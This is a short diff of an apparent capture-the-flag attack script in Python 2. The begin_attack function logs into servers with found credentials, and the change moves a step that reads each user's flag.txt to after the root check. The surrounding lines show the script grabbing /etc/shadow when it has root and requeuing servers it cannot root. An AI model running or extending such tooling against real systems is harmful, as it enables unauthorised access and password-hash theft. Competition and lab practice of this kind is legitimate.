@@ -188,16 +188,6 @@ def begin_attack(client):
                     except Exception as e:
                         print e
 
-            # try to find flag for the current user
-            stdin, stdout, stderr = client.exec_command("cat ~/flag.txt")
-            flag = stdout.readlines()
-            if len(flag) > 0:
-                print "FLAG FOUND ON %s:\t %s" % (server.host, flag[0])
-                return
-            else:
-                print "Flag not found on %s@%s" % (userCred, server.host)
-
-
             # if we are logged in as root
             if log_root:
                 print "Grabbing /etc/shadow on %s" % (server.host)
@@ -225,6 +215,17 @@ def begin_attack(client):
             # put back in queue if never logged in as root
             else:
                 q.put(server)
+
+            # try to find flag for the current user if we weren't root
+            stdin, stdout, stderr = client.exec_command("cat ~/flag.txt")
+            flag = stdout.readlines()
+            if len(flag) > 0:
+                print "FLAG FOUND ON %s:\t %s" % (server.host, flag[0])
+                return
+            else:
+                print "Flag not found on %s@%s" % (userCred, server.host)
+
+
 
         # otherwise, we could not login and need to keep searching for creds
         else:
